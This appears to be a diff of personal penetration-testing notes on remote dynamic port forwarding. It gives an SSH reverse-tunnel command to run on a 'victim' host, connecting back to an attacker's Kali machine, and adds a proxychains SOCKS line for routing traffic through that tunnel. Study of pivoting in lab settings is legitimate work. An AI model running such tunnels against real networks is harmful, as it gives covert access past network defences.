@@ -27,7 +27,7 @@
 
 ## REMOTE dynamic port fw
 - run this in victim 1 ``` ssh -N -R 9998 kali@192.168.118.4 ```
-- edit proxychains conf
+- edit proxychains conf ```  socks 127.0.0.1 9998```
 - need to use proxychains as above in kali to run commands
 - **care** about
 
